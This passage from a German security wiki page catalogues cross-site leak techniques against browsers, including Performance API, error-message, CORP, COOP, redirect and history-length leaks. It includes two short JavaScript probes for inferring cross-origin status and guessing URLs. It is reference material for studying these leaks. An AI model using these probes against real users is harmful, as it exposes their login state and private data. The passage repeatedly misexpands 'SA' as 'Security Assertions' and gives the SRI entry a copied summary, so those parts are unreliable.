In Security Assertions (SA) kann der XSS Auditor, der ursprünglich Cross-Site Scripting verhindern sollte, paradoxerweise zur Informationsleak-Ausnutzung führen. Obwohl dieses Feature aus Google Chrome (GC) entfernt wurde, ist es in SA noch vorhanden. 2013 zeigten Braun und Heiderich, dass der XSS Auditor legitime Skripte blockieren kann, was zu False Positives führt. Darauf aufbauend wurden Techniken entwickelt, um Informationen zu extrahieren und spezifische Inhalte auf cross-origin Seiten zu detektieren (XS-Leaks), zuerst von Terada berichtet und später von Heyes erläutert. Während diese Techniken ursprünglich auf den XSS Auditor in GC zielten, wurde entdeckt, dass in SA Seiten, die vom XSS Auditor geblockt werden, keine Einträge in der Performance API erzeugen, was eine Methode offenbart, über die weiterhin sensitive Informationen geleakt werden können.

### X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Summary:** Ressourcen mit X-Frame-Options Header erzeugen keinen resource timing Eintrag.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Wenn eine Seite **nicht im iframe gerendert werden darf**, erzeugt sie keinen Performance-Eintrag. Dadurch kann ein Angreifer den Response-Header **`X-Frame-Options`** erkennen.\
Dasselbe passiert, wenn du ein **embed**-Tag verwendest.

### Download Detection

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Downloads erzeugen in der Performance API keine resource timing Einträge.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Ähnlich wie bei dem beschriebenen XS-Leak erzeugt eine **Ressource, die aufgrund des ContentDisposition-Headers heruntergeladen wird**, ebenfalls keinen Performance-Eintrag. Diese Technik funktioniert in allen großen Browsern.

### Redirect Start Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Redirect
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Resource timing Eintrag leakt die Startzeit einer Weiterleitung.
- **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Wir fanden eine XS-Leak-Instanz, die das Verhalten einiger Browser ausnutzt, die zu viele Informationen für cross-origin Requests protokollieren. Der Standard definiert eine Teilmenge von Attributen, die für cross-origin Ressourcen auf null gesetzt werden sollten. In **SA** ist es jedoch möglich zu erkennen, ob der User **von der Zielseite weitergeleitet** wurde, indem man die **Performance API** abfragt und die **redirectStart**-Timing-Daten prüft.

### Duration Redirect Leak

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Redirect
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Die Dauer von Timing-Einträgen ist negativ, wenn eine Weiterleitung auftritt.
- **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

In GC ist die **duration** für Requests, die zu einer **Redirect** führen, **negativ** und kann somit von Requests unterschieden werden, die keine Weiterleitung haben.

### CORP Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Ressourcen, die mit CORP geschützt sind, erzeugen keine resource timing Einträge.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

In manchen Fällen kann der **nextHopProtocol Eintrag** als Leak-Technik verwendet werden. In GC ist bei gesetztem **CORP Header** das nextHopProtocol **leer**. Beachte, dass SA für CORP-geschützte Ressourcen gar keinen Performance-Eintrag erstellt.

### Service Worker

- **Inclusion Methods**: Frames
- **Detectable Difference**: API Usage
- **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Summary:** Erkennen, ob für eine spezifische Origin ein Service Worker registriert ist.
- **Code Example**:

Service Worker sind ereignisgesteuerte Script-Kontexte, die auf einer Origin laufen. Sie laufen im Hintergrund und können Ressourcen abfangen, modifizieren und **cachen**, um Offline-Funktionalität zu bieten.\
Wenn eine **vom Service Worker gecachte Ressource** via **iframe** angefragt wird, wird die Ressource **aus dem Service Worker Cache** geladen.\
Um zu erkennen, ob die Ressource aus dem Service Worker Cache geladen wurde, kann die **Performance API** genutzt werden.\
Das kann auch mit einem Timing-Angriff gemacht werden (siehe Paper für mehr Details).

### Cache

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Summary:** Es ist möglich zu prüfen, ob eine Ressource im Cache gespeichert wurde.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

Mit der [Performance API](#performance-api) ist es möglich zu prüfen, ob eine Ressource gecached ist.

### Network Duration

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Summary:** Es ist möglich, die Network Duration eines Requests aus der `performance` API zu entnehmen.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

- **Inclusion Methods**: HTML Elements (Video, Audio)
- **Detectable Difference**: Status Code
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Summary:** In Firefox ist es möglich, den Statuscode einer cross-origin Anfrage genau zu leaken.
- **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
Die `message`-Eigenschaft des `MediaError`-Interfaces identifiziert erfolgreich geladene Ressourcen eindeutig durch einen eigenen String. Ein Angreifer kann diese Eigenschaft ausnutzen, indem er den Inhalt der Nachricht beobachtet und so den Antwortstatus einer cross-origin Ressource ableitet.

### CORS Error

- **Einbindungsmethoden**: Fetch API
- **Erkennbare Differenz**: Header
- **Mehr Info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Zusammenfassung:** In Security Assertions (SA) enthüllen CORS-Fehlermeldungen unbeabsichtigt die vollständige URL von weitergeleiteten Requests.
- **Code-Beispiel**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Diese Technik ermöglicht es einem Angreifer, das **Ziel einer Redirects einer cross-origin Site zu extrahieren**, indem ausgenutzt wird, wie Webkit-basierte Browser CORS-Requests verarbeiten. Konkret: Wenn ein **CORS-enabled request** an eine Zielseite gesendet wird, die abhängig vom Benutzerzustand weiterleitet, und der Browser die Anfrage anschließend ablehnt, wird die **vollständige URL des Redirect-Ziels** in der Fehlermeldung offenbart. Diese Schwachstelle verrät nicht nur das Vorhandensein der Weiterleitung, sondern legt auch den Endpunkt der Weiterleitung und eventuelle **sensible Query-Parameter** offen.

### SRI Error

- **Einbindungsmethoden**: Fetch API
- **Erkennbare Differenz**: Header
- **Mehr Info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Zusammenfassung:** In Security Assertions (SA) enthüllen CORS-Fehlermeldungen unbeabsichtigt die vollständige URL von weitergeleiteten Requests.
- **Code-Beispiel**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Ein Angreifer kann **ausführliche Fehlermeldungen** ausnutzen, um die Größe von cross-origin Antworten zu ermitteln. Das ist durch Subresource Integrity (SRI) möglich, das mit dem integrity-Attribut sicherstellt, dass abgefragte Ressourcen (oft von CDNs) nicht manipuliert wurden. Damit SRI bei cross-origin Ressourcen funktioniert, müssen diese **CORS-enabled** sein; ansonsten unterliegen sie keinen Integritätsprüfungen. In Security Assertions (SA), ähnlich wie beim CORS error XS-Leak, kann nach einem fehlgeschlagenen Fetch-Request mit integrity-Attribut eine Fehlermeldung abgefangen werden. Angreifer können diesen Fehler absichtlich **auslösen**, indem sie dem integrity-Attribut einen **falschen Hash** zuweisen. In SA offenbart die resultierende Fehlermeldung unbeabsichtigt die Content-Length der angeforderten Ressource. Diese Information ermöglicht es einem Angreifer, Unterschiede in der Antwortgröße zu erkennen und dadurch komplexe XS-Leak-Angriffe zu ermöglichen.

### CSP Violation/Detection

- **Einbindungsmethoden**: Pop-ups
- **Erkennbare Differenz**: Status Code
- **Mehr Info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Zusammenfassung:** Wenn auf der Angreiferseite nur die Website des Opfers in der CSP erlaubt ist und wir sie aufrufen, versucht sie auf eine andere Domain umzuleiten, wird die CSP einen detektierbaren Fehler auslösen.
- **Code-Beispiel**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Ein XS-Leak kann CSP nutzen, um zu erkennen, ob eine cross-origin Seite zu einer anderen Origin weitergeleitet wurde. Dieses Leak kann die Weiterleitung erkennen und zusätzlich die Domain des Weiterleitungsziels offenbaren. Die Grundidee dieses Angriffs ist, die Ziel-Domain auf der Angreiferseite zu **erlauben**. Sobald eine Anfrage an die Ziel-Domain gestellt wird und sie zu einer cross-origin Domain **redirectet**, **blockiert CSP** den Zugriff darauf und erzeugt einen **Violation-Report**, der als leak-Technik genutzt werden kann. Je nach Browser **kann dieser Report das Ziel der Weiterleitung offenlegen**. Moderne Browser geben zwar nicht immer die weitergeleitete URL an, aber man kann dennoch erkennen, dass eine cross-origin Weiterleitung ausgelöst wurde.

### Cache

- **Einbindungsmethoden**: Frames, Pop-ups
- **Erkennbare Differenz**: Seiteninhalt
- **Mehr Info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Zusammenfassung:** Entferne die Datei aus dem Cache. Öffne die Zielseite und prüfe, ob die Datei noch im Cache vorhanden ist.
- **Code-Beispiel:**

Browser könnten einen gemeinsamen Cache für alle Websites verwenden. Unabhängig von ihrer Origin ist es möglich, abzuleiten, ob eine Zielseite eine **bestimmte Datei angefordert** hat.

Wenn eine Seite ein Bild nur lädt, falls der Benutzer eingeloggt ist, kannst du die **Resource invalidieren** (so dass sie nicht mehr gecached wird, falls sie es war, siehe Mehr-Info-Links), eine Anfrage ausführen, die diese Resource laden könnte, und anschließend versuchen, die Resource **mit einer fehlerhaften Anfrage** zu laden (z. B. mit einem überlangen Referer-Header). Wenn das Laden der Ressource **keinen Fehler auslöst**, liegt das daran, dass sie **aus dem Cache** bedient wurde.

### CSP Directive

- **Einbindungsmethoden**: Frames
- **Erkennbare Differenz**: Header
- **Mehr Info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Zusammenfassung:** CSP-Header-Directives können mithilfe des CSP-iframe-Attributs abgefragt werden, wodurch Policy-Details offengelegt werden.
- **Code-Beispiel**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Eine neue Funktion in Google Chrome (GC) erlaubt Webseiten, eine Content Security Policy (CSP) vorzuschlagen, indem ein Attribut am iframe-Element gesetzt wird; die Policy-Directives werden zusammen mit der HTTP-Anfrage übertragen. Normalerweise muss der eingebettete Inhalt dies per HTTP-Header **autorisiert** sein, andernfalls wird eine **Fehlerseite angezeigt**. Wenn das iframe jedoch bereits einer CSP unterliegt und die vorgeschlagene Policy nicht restriktiver ist, wird die Seite normal geladen. Dieser Mechanismus eröffnet einem Angreifer die Möglichkeit, bestimmte CSP-Directives einer cross-origin Seite zu **erkennen**, indem er die Fehlerseite identifiziert. Obwohl diese Schwachstelle als behoben markiert wurde, zeigen unsere Ergebnisse eine **neue leak-Technik**, die die Fehlerseite detektieren kann, was darauf hindeutet, dass das zugrundeliegende Problem nie vollständig behoben wurde.

### **CORP**

- **Einbindungsmethoden**: Fetch API
- **Erkennbare Differenz**: Header
- **Mehr Info**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Zusammenfassung:** Ressourcen, die mit Cross-Origin Resource Policy (CORP) geschützt sind, werfen einen Fehler, wenn sie von einer nicht erlaubten Origin abgefragt werden.
- **Code-Beispiel**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

Der CORP-Header ist eine relativ neue Web-Plattform-Sicherheitsfunktion, die no-cors Cross-Origin-Requests zu der betreffenden Ressource **blockiert**. Das Vorhandensein des Headers kann erkannt werden, da eine mit CORP geschützte Ressource beim Fetch **einen Fehler wirft**.

### CORB

- **Einbindungsmethoden**: HTML Elements
- **Erkennbare Differenz**: Headers
- **Mehr Info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Zusammenfassung**: CORB kann Angreifern erlauben zu erkennen, wann der **`nosniff` header** in der Anfrage vorhanden ist.
- **Code-Beispiel**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Siehe den Link für weitere Informationen zum Angriff.

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Einbindungsmethoden**: Fetch API
- **Erkennbare Differenz**: Headers
- **Mehr Info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **Zusammenfassung**: Wenn der Origin-Header im Header `Access-Control-Allow-Origin` reflektiert wird, ist es möglich zu prüfen, ob eine Ressource bereits im Cache ist.
- **Code-Beispiel**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Falls der **Origin header** im Header `Access-Control-Allow-Origin` **reflektiert** wird, kann ein Angreifer dieses Verhalten ausnutzen, um zu versuchen, die **Resource** im **CORS**-Modus zu **fetchen**. Wenn dadurch **kein Fehler** ausgelöst wird, wurde die Ressource **korrekt vom Web** abgerufen; wenn jedoch ein **Fehler** auftritt, liegt das daran, dass sie **aus dem Cache** bedient wurde (der Fehler entsteht, weil der Cache eine Antwort mit einem CORS-Header speichert, der die ursprüngliche Domain erlaubt und nicht die Domain des Angreifers)**.**\
Beachte, dass dies nicht funktioniert, wenn statt der Reflexion ein Wildcard verwendet wird (`Access-Control-Allow-Origin: *`).

## Readable Attributes Technique

### Fetch Redirect

- **Einbindungsmethoden**: Fetch API
- **Erkennbare Differenz**: Status Code
- **Mehr Info**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Zusammenfassung:** GC und SA erlauben es, den response.type (opaqueredirect) nach Abschluss der Weiterleitung zu prüfen.
- **Code-Beispiel**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Wenn ein Request mit der Fetch API und `redirect: "manual"` sowie weiteren Parametern abgeschickt wird, ist es möglich, das `response.type`-Attribut auszulesen; ist dieser Wert `opaqueredirect`, dann war die Response ein Redirect.

### COOP

- **Einbindungsmethoden**: Pop-ups
- **Erkennbare Differenz**: Header
- **Mehr Info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Zusammenfassung:** Seiten, die durch Cross-Origin Opener Policy (COOP) geschützt sind, verhindern Zugriffe aus cross-origin Interaktionen.
- **Code-Beispiel**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Ein Angreifer kann das Vorhandensein des Cross-Origin Opener Policy (COOP)-Headers in einer cross-origin HTTP-Antwort feststellen. COOP wird von Webanwendungen verwendet, um zu verhindern, dass externe Seiten beliebige window-Referenzen erhalten. Das Vorhandensein dieses Headers lässt sich erkennen, indem versucht wird, die **`contentWindow`-Referenz** zuzugreifen. In Fällen, in denen COOP bedingt angewandt wird, ist die **`opener`-Property** ein Indikator: sie ist **undefined**, wenn COOP aktiv ist, und **defined**, wenn nicht.

### URL Max Length - Server Side

- **Einbindungsmethoden**: Fetch API, HTML Elements
- **Erkennbare Differenz**: Status Code / Content
- **Mehr Info**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Zusammenfassung:** Unterschiede in Antworten erkennen, weil die Redirect-Response-Länge zu groß sein kann und der Server mit einem Fehler antwortet, der ein alert auslöst.
- **Code-Beispiel**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Wenn ein serverseitiger Redirect **Benutzereingaben** innerhalb der Weiterleitung verwendet und **zusätzliche Daten** anhängt, lässt sich dieses Verhalten erkennen, weil **Server** in der Regel eine **Limitierung der Request-Länge** haben. Wenn die **Benutzerdaten** etwa **Länge - 1** ausnutzen und der Redirect **noch etwas zusätzlich hinzufügt**, kann das einen **Fehler** auslösen, der über Error Events detektierbar ist.

Wenn du es schaffst, Cookies für einen Benutzer zu setzen, kannst du diesen Angriff auch durchführen, indem du **genug Cookies setzt** ([**cookie bomb**](../hacking-with-cookies/cookie-bomb.md)), sodass durch die **größere Antwortgröße** der korrekten Response ein **Fehler** ausgelöst wird. In diesem Fall denke daran, dass, wenn du die Anfrage von derselben Seite aus triggerst, ein `<script>` automatisch die Cookies mitsendet (du kannst also auf Fehler prüfen).\
Ein Beispiel für **cookie bomb + XS-Search** findet sich in der Intended solution dieses Writeups: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Für diese Art von Angriff ist in der Regel `SameSite=None` oder derselbe Kontext erforderlich.

### URL Max Length - Client Side

- **Einbindungsmethoden**: Pop-ups
- **Erkennbare Differenz**: Status Code / Content
- **Mehr Info**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Zusammenfassung:** Unterschiede in Antworten erkennen, weil die Redirect-Response-Länge für eine Anfrage zu groß sein kann und dadurch ein Unterschied bemerkbar wird.
- **Code-Beispiel**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Laut [Chromium-Dokumentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length) liegt die maximale URL-Länge von Chrome bei 2MB.

> Im Allgemeinen hat die Webplattform keine Limits für die Länge von URLs (obwohl 2^31 ein verbreitetes Limit ist). Chrome begrenzt URLs aus praktischen Gründen und um Denial-of-Service-Probleme in der Inter-Process-Kommunikation zu vermeiden auf maximal **2MB**.

Wenn also die **Redirect-URL in einem der Fälle größer ist**, kann man sie so konstruieren, dass sie **größer als 2MB** ist, um das **Längenlimit** zu erreichen. In diesem Fall zeigt Chrome eine **`about:blank#blocked`**-Seite an.

Der **auffällige Unterschied** ist: wenn die **Weiterleitung abgeschlossen** wurde, wirft `window.origin` einen **Fehler**, weil eine cross-origin Seite diese Info nicht abrufen darf. Wenn jedoch das **Limit** erreicht wurde und die geladene Seite `about:blank#blocked` ist, bleibt die **`origin`** des Fensters die des **Parents**, was eine **zugängliche Information** ist.

Alle zusätzlichen Daten, die benötigt werden, um die **2MB** zu erreichen, können über einen **Hash** in der initialen URL hinzugefügt werden, sodass sie im Redirect verwendet werden.

{{#ref}}
url-max-length-client-side.md
{{#endref}}

### Max Redirects

- **Einbindungsmethoden**: Fetch API, Frames
- **Erkennbare Differenz**: Status Code
- **Mehr Info**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Zusammenfassung:** Nutze das Redirect-Limit des Browsers, um das Auftreten von URL-Weiterleitungen festzustellen.
- **Code-Beispiel**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Wenn die **maximale** Anzahl von **Redirects**, die ein Browser folgen darf, **20** beträgt, könnte ein Angreifer versuchen, seine Seite mit **19 Redirects** zu laden und schließlich den Benutzer zur getesteten Seite zu schicken. Wenn dann ein **Fehler** ausgelöst wird, hat die Seite versucht, den Benutzer weiterzuleiten.

### History Length

- **Einbindungsmethoden**: Frames, Pop-ups
- **Erkennbare Differenz**: Redirects
- **Mehr Info**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Zusammenfassung:** JavaScript kann die Browser-History manipulieren und über die length-Property ausgelesen werden.
- **Code-Beispiel**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Die **History API** erlaubt es JavaScript, die Browser-History zu manipulieren, welche die vom Benutzer besuchten Seiten speichert. Ein Angreifer kann die length-Property als Einbindungsmethode nutzen: um JavaScript- und HTML-Navigationsvorgänge zu detektieren.\
Man prüft **`history.length`**, lässt einen Nutzer zu einer Seite navigieren, ändert sie zurück zur same-origin und überprüft anschließend den neuen Wert von **`history.length`**.

### History Length with same URL

- **Einbindungsmethoden**: Frames, Pop-ups
- **Erkennbare Differenz**: If URL is the same as the guessed one
- **Zusammenfassung:** Es ist möglich zu ermitteln, ob der Ort (location) eines Frames/Pop-ups eine bestimmte URL hat, indem man die History-Länge ausnutzt.
- **Code-Beispiel**: Below

Ein Angreifer könnte JavaScript verwenden, um die Location des Frames/Pop-ups auf eine **geratene URL** zu setzen und **sofort** danach auf `about:blank` zu wechseln. Wenn die History-Länge angestiegen ist, bedeutet das, dass die URL korrekt war und Zeit hatte, zu **inkrementieren**, weil die URL nicht neu geladen wird, wenn sie identisch ist. Falls sie nicht angestiegen ist, bedeutet das, dass versucht wurde, die geratene URL zu laden, aber weil unmittelbar danach `about:blank` geladen wurde, ist die History-Länge beim Laden der geratenen URL nicht angestiegen.
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Frame Counting

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Summary:** Evaluate the quantity of iframe elements by inspecting the `window.length` property.
- **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Das Zählen der **Anzahl von Frames** in einer per `iframe` oder `window.open` geöffneten Seite kann dabei helfen, den **Status des Benutzers auf dieser Seite** zu bestimmen.\
Wenn eine Seite immer dieselbe Anzahl an Frames hat, kann das **kontinuierliche** Überwachen der Frame-Anzahl ein **Muster** aufdecken, das Informationen leaken könnte.

Ein Beispiel: In Chrome kann ein **PDF** mittels **frame counting** erkannt werden, weil intern ein `embed` verwendet wird. Es gibt [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113), die gewisse Inhalte steuern (z. B. `zoom`, `view`, `page`, `toolbar`), wodurch diese Technik interessant sein kann.

### HTMLElements

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Summary:** Read the leaked value to distinguish between 2 possible states
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Information leakage durch HTML-Elemente ist ein Problem in der Web-Sicherheit, insbesondere wenn Medien dynamisch basierend auf Benutzerinformationen erzeugt werden oder Watermarks hinzugefügt werden, die die Mediengröße verändern. Ein Angreifer kann dadurch durch Auswertung bestimmter HTML-Elemente zwischen verschiedenen Zuständen unterscheiden.

### Information Exposed by HTML Elements

- **HTMLMediaElement**: Dieses Element gibt die `duration` und `buffered` Zeiten des Mediums preis, zugänglich über seine API. [Read more about HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Es legt `videoHeight` und `videoWidth` offen. In einigen Browsern sind zusätzliche Eigenschaften wie `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` und `webkitDecodedFrameCount` verfügbar, die detailliertere Informationen über den Media-Content liefern. [Read more about HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Diese Funktion liefert Details zur Video-Wiedergabequalität, einschließlich `totalVideoFrames`, was auf die Menge verarbeiteter Videodaten hinweisen kann. [Read more about getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Dieses Element gibt die `height` und `width` eines Bildes preis. Ist ein Bild ungültig, geben diese Eigenschaften 0 zurück, und `image.decode()` wird abgelehnt, was auf ein Ladeproblem hinweist. [Read more about HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Summary:** Identify variations in website styling that correlate with the user's state or status.
